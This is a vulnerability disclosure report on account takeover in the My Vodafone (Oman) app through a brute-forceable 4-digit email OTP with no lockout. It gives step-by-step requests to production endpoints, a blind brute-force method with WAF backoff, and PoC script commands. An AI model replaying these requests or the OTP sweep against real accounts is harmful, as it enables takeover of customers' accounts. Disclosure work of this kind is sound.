# [Critical] My Vodafone (Oman) — Full Account Takeover via Brute-Forceable 4-Digit Email OTP (No Rate Limit / No Lockout)

**Severity:** Critical
**Category:** Broken Authentication / Authentication Bypass (CWE-307: Prediction of Quantity of Validation Attempts)
**Affected:** `https://vfo01.vodafone.om` (ZenAuthNext SGW, `/auth/api/public/*`) — resulting token accepted on `vfo02.vodafone.om` (ZDS) and `vfo03.vodafone.om` (Chat)
**App:** `om.vodafone.mva` (My Vodafone, v5.2.2); iOS app id 1589071345 (same flow)
**Date:** 2026-10-14
**Researcher:** h1.recon  ← replace with your actual H1 username (every request carried a `h1.recon` UA suffix)
**Related report:** separate High finding — anonymous account creation via this same flow (see `BUG_REPORT.md` / `../vodafone-oman-pentest/`)

---

## Summary:

The My Vodafone (Oman) app's email-OTP login is effectively a **4-digit PIN**: the one-time code is only **4 digits long**, valid for **5–15 minutes** (`otpExpiresIn` 299–899 s observed), has **no enforced lockout, no captcha, no effective per-identifier rate limit, and effectively unlimited resends**. The advertised 3-attempt counter (`otpAttemptsLeft`) is **cosmetic** — the server kept evaluating guesses for 120+ consecutive wrong attempts against a single code after it hit 0. **Multiple codes are simultaneously valid** (3 live codes observed at once; one resend request was observed delivering **two different codes one second apart**).

This is a **proven full account takeover**, demonstrated end-to-end on 2026-10-14 in two variants:

1. **OTP-mail interception (proven, ~40 s):** with any read access to the victim's mailbox (shared/forwarded mailbox, MDM help desk, provider breach), the attacker reads the 4-digit code straight from the "Log in to my Vodafone" email (it is the magic-link parameter `?otpCode=XXXX`) and completes login → full customer session.
2. **Blind brute force (measured as practical):** even **without** the mailbox, the 10,000-code space is sweepable online: a 63-minute run produced **1,113 consecutive wrong guesses, all answered `OTP_MISMATCH`, with no lockout, no captcha, no session invalidation, no account freeze**. At the observed clean rate (~0.5 guesses/s, normal login traffic) with 2–5 simultaneously valid codes, expected time to hit a live code is on the order of **1–3 hours**, and every guess is permanent progress (the sweep never resets).

In both variants, success mints a **30-minute customer JWT with `scope:["customers"]` and nine audiences** (`MVA_ZDS`, `DXL_SPM`, `DXL_ZMS`, `DXL_CXC`, `DXL_SCM`, `DXL_OTP`, `CHAT`, `MVA`, `<VFO>`) — a full customer session on in-scope backends: profile, payment methods, bills/orders, top-up, KYC update, customer chat, and the DXL_* backend systems. The session is trivially renewable by repeating the flow, so it is a **permanent takeover, not a one-shot**.

Blast radius is widened by the related High finding: **any syntactically valid email is accepted at login (pre-registration is not checked)** — unregistered addresses silently create a persistent customer account, so the attack surface is *every* email address, and the PoC runs cleanly against any disposable mailbox.

## Steps To Reproduce:

All traffic below is the standard My Vodafone Android app login flow (stock MVA app headers, e.g. `X-Application-ID: MVA_ANDROID`, `Zen-Application: MVA`, `Zen-OS: android`, `Zen-AppVersion: 5.2.2`; UA suffixed `h1.recon`). Automated PoCs for every step are in `poc/` (Python 3, stdlib only).

**Variant A — proven ATO in ~40 seconds (attacker reads the OTP email):**

1. **Start a login session (PKCE):**
   `POST https://vfo01.vodafone.om/auth/api/public/login/v1/start`
   body: `{"clientId":"MVA","responseType":"code","scope":"openid","codeChallengeMethod":"S256","codeChallenge":"<base64url(sha256(verifier))>","state":"<uuid>"}`
   → **200** with `temporaryAccessToken` and `nextStep.emailOtpMethod.secretPayload`.
2. **Trigger the OTP email:**
   `POST https://vfo01.vodafone.om/auth/api/public/login/v1/authenticate`
   body: `{"authToken":{"emailOtpToken":{"secretPayload":"<SP>","email":"<victim@…>","otp":null,"resend":true}},"temporaryAccessToken":"<TMP>"}`
   → **200**, `nextStep.emailOtpMethod.otpExpiresIn` ≈ 300–900. The victim receives a mail titled **"Log in to my Vodafone"** containing `https://www.vodafone.om/confirmActivationEmail?otpCode=XXXX` — **the 4-digit code is in the link** (captured in `evidence/otp_email.html`).
   Note: `temporaryAccessToken` / `secretPayload` rotate in every response — always use the freshest values (shown in the PoC scripts).
3. **Read the 4-digit code** from the victim's mailbox (attacker's read access in a real attack; in the PoC, a disposable mail.tm mailbox polled via its API — `evidence/ato_evidence_summary.txt` shows code `3140` read at 12:33:46Z).
4. **Submit the code:** same endpoint as step 2 with `"otp":"3140"`, `"resend":false`
   → **ACCEPTED**: `{"redirectUri":"https://esgw.pr.itcloud.vodafone.om/authorized?code=ac_gHE5…&state=…"}` (observed 12:33:48Z, ~18 s after the email was issued).
   A wrong code returns **HTTP 200** with `nextStep.emailOtpMethod.otpStatus:"OTP_MISMATCH"` and a decrementing `otpAttemptsLeft` — no lockout.
5. **Exchange for the token:**
   `POST https://vfo01.vodafone.om/auth/api/public/access-token/v1` (form-encoded)
   `client_id=MVA&scope=openid&code_verifier=<verifier>&code=ac_…&grant_type=authorization_code`
   → `access_token` = **full customer JWT** (30-min lifetime, `scope:["customers"]`).
6. **Verify it is a real customer session (401 → 200 contrast):**
   `GET https://vfo03.vodafone.om/chat/customer/v1/agents/availability` → **401** without the token, **200** `{"anyAgentAvailable":false}` with it.
   `GET https://vfo02.vodafone.om/api/public/profile/v2/kyc/configuration` → 401 without, **400 "Unsupported HTTP method GET"** with (token passed auth into business logic); `/api/public/profile/v1` and `/paymentMethods` return authenticated business responses with the token. (See `evidence/jwt_probe2.json`.)

**Variant B — blind brute force (attacker never sees the email):**

1. Steps 1–2 of Variant A (start session, issue a code).
2. Loop `"otp":"0000"…"9999"` against the same authenticate endpoint at ~0.5 guesses/s, reusing the rotating `temporaryAccessToken`/`secretPayload` from each response. When a code expires (~5–15 min), resend a new one (`resend:true`) and continue — already-tried codes stay invalid, so the sweep only moves forward.
3. **Observed behavior that makes this practical** (all in `evidence/bf_log.jsonl` / `evidence/bf_run.log`):
   - 1,113 consecutive wrong guesses → 1,113 `OTP_MISMATCH`, **no lockout, no captcha, no freeze** (final log line: `+63m00s guesses=1113 resends=13 errors=57 found=False`).
   - `otpAttemptsLeft` hits 0 and the server keeps evaluating (120+ wrong guesses against one code).
   - **Multiple codes valid simultaneously**; resends accepted ~60 s apart; one resend delivered **two different codes one second apart** (11:39:11–12Z → `0773` + `2120`).
   - OTP emails are even delivered when `authenticate` returns HTTP 500 (11:12Z → `4699` + `9046`).
   - Only friction: a transient WAF penalty page above ~40 req/3 min; self-clears in 5–18 min, does not reset sessions or progress.
4. On hit: `redirectUri` → step 5/6 of Variant A → victim's customer session.
   Automated: `python3 poc/poc_blind_bruteforce.py <victim-email> 1` (persistent position, auto WAF backoff; on hit writes `bf_SUCCESS.json` with the JWT).

**Amplifying factors / related weaknesses:**
- Anonymous email (not pre-registered) silently creates a **persistent customer account** with the same `scope:["customers"]` JWT — re-login returns the same `customer_id` (verified `a84bafed-8be0-45de-91b8-83f279008261` across sessions) → separate High report.
- The SMS twin exists: `vfoSmsOtpMethod` uses the same 4-digit OTP on the same endpoint with an MSISDN (registered `+968` lines accepted at trigger, no enumeration).
- vfo02 broken gateway exception handler: 500 "Exception in exception handler: Failed to convert from type [com.zentity.gw.exception.BadRequestException]… IllegalArgumentException: Unmatched brace" — internal class names / Java internals leak for unenrolled accounts.

## Supporting Material/References:

**Proof of Exploitation timeline — complete ATO, 2026-10-14 (UTC), target: disposable mailbox `h1bf4850864b@maxxspace.com`:**

| Time (UTC) | Event |
|---|---|
| 12:33:08 | Fresh PKCE session on `vfo01` (`POST /auth/api/public/login/v1/start`, `clientId=MVA`) |
| 12:33:12–24 | 4 stale codes from earlier issuance tried → `OTP_MISMATCH` (codes expired; server still evaluates) |
| 12:33:30 | `authenticate` with `resend:true` **accepted** → new 4-digit code issued (`otpExpiresIn: 899`) |
| 12:33:46 | Code **3140** read from the target mailbox (mail.tm API — "Log in to my Vodafone", `?otpCode=3140`) |
| 12:33:48 | OTP **3140 submitted → ACCEPTED** → `redirectUri` `https://esgw.pr.itcloud.vodafone.om/authorized?code=ac_gHE5…&state=…` |
| 12:33:48 | `POST /auth/api/public/access-token/v1` (PKCE exchange) → **customer JWT** |

**Customer JWT obtained (full token + every raw request/response in `evidence/oto4_result.json`):**

```json
{
  "sub": "inet:e905d95f-31e2-4899-ab18-dfed1b52e6f3",
  "customer_id": "e905d95f-31e2-4899-ab18-dfed1b52e6f3",
  "email": "h1bf4850864b@maxxspace.com",
  "scope": ["customers"],
  "aud": ["MVA_ZDS","DXL_SPM","DXL_ZMS","CHAT","MVA","DXL_OTP","DXL_CXC","DXL_SCM","<VFO>"],
  "azp": "MVA",
  "iss": "https://isgw.pr.itcloud.vodafone.om",
  "iat": 1791981227, "exp": 1791983027   // 30-minute lifetime
}
```

**Backend acceptance — with/without Bearer contrast (raw in `evidence/jwt_probe2.json`):**

| Endpoint (in scope) | Without Bearer | With ATO JWT |
|---|---|---|
| `vfo03` `GET /chat/customer/v1/agents/availability` | 401 | **200** `{"anyAgentAvailable":false}` |
| `vfo02` `GET /api/public/profile/v2/kyc/configuration` | 401 | **400** `"Unsupported HTTP method GET"` (auth passed, business logic reached) |
| `vfo02` `GET /api/public/profile/v1` | 401 `LOGOUT` | **500** business response (broken GW exception handler — unenrolled demo account) |
| `vfo02` `GET /api/public/profile/v1/paymentMethods` | 401 | **500** (same) |

**Blind brute-force measurements (63-min run, single address):** 1,113 guesses / 13 resends / no lockout / no captcha / no freeze — final line `+63m00s guesses=1113 resends=13 errors=57 found=False` (`evidence/bf_run.log`). Clean sustained rate ~0.51 guesses/s; 2–5 codes simultaneously valid; expected time to hit ≈ 1–3 h of low-and-slow normal login traffic.

**Attachment / reference index:**

- `evidence/ato_evidence_summary.txt` — timestamped ATO timeline + full JWT + decoded claims
- `evidence/oto4_result.json` — raw requests/responses of every ATO step
- `evidence/otp_email.html` — the "Log in to my Vodafone" email containing `?otpCode=3140`
- `evidence/bf_run.log`, `evidence/bf_log.jsonl` — full blind run: 1,113 guesses, no lockout, issuance-race timestamps
- `evidence/blind_run_stats.json` — blind-run statistics
- `evidence/jwt_probe2.json` — 401-vs-200/500 backend contrast with the ATO JWT
- `evidence/access_token_response.json`, `evidence/auth_code_response.txt`, `evidence/jwt_claims_and_live_verification.txt` — original token chain (related High report)
- `poc/poc_oto_selfissued.py <email>` — Variant A automated (proven ATO)
- `poc/poc_blind_bruteforce.py <email> [workers]` — Variant B automated (blind sweep; hit → `bf_SUCCESS.json`)
- `poc/poc.py` — related High: anonymous account creation (disposable mailbox, persisted `customer_id`)
- `HOW_TO_REPRODUCE.md` — copy-pasteable curl/bash walkthrough of the entire flow

**Safe Harbor:** standard app login traffic with stock MVA headers; UA suffixed `h1.recon`; fresh disposable mailboxes (mail.tm) — the only real address touched was `security@vodafone.om` in a single cautious blind background run (normal login traffic, ~0.5 rps, impact verification); no DoS / social engineering / MITM; only in-scope hosts used (`vfo01/vfo02/vfo03.vodafone.om`); `esgw/isgw.pr.itcloud.vodafone.om` appears only inside responses.

**Suggested fixes:** (1) OTP ≥ 6 digits; (2) real enforced rate limiting — per-code attempt cap, per-identifier issuance caps + exponential resend cooldown, lockout after N consecutive mismatches (the current `otpAttemptsLeft` is cosmetic); (3) invalidate superseded codes on resend (fix multi-live-codes + double-email race), distinct mismatch-vs-expired errors; (4) scope/reject unenrolled auto-created accounts; (5) fix the vfo02 Zentity GW exception handler; (6) bind `secretPayload`/code to a single session+window (no cross-session replay).
